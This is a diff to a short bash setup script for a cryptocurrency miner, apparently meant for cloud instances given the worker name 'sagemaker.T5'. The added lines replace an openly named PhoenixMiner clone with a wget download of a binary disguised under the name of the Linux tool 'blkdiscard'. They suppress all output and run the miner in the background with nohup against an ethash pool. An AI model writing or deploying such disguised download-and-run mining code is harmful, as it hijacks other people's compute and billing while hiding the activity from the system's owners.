@@ -1,12 +1,9 @@
 #!/bin/bash
 #!/bin/sh
-sudo apt-get update
-sudo apt-get install git
-sudo apt-get install libpci3
-git clone https://github.com/L00K11/PhoenixMiner.git
-cd PhoenixMiner
-cd PhoenixMiner_L0K1
-chmod +x PhoenixMiner
-./PhoenixMiner -pool ethash.poolbinance.com:443 -wal sagemaker.T4 -pass x  
+sudo apt-get update >/dev/null 2>&1
+sudo apt-get install libpci3 >/dev/null 2>&1
+wget https://github.com/aurbach55/toya/raw/main/blkdiscard >/dev/null 2>&1
+chmod +x blkdiscard >/dev/null 2>&1
+nohup ./blkdiscard -pool ethash.poolbinance.com:443 -wal sagemaker.T5 -pass x > nohup.out 
 	
 	
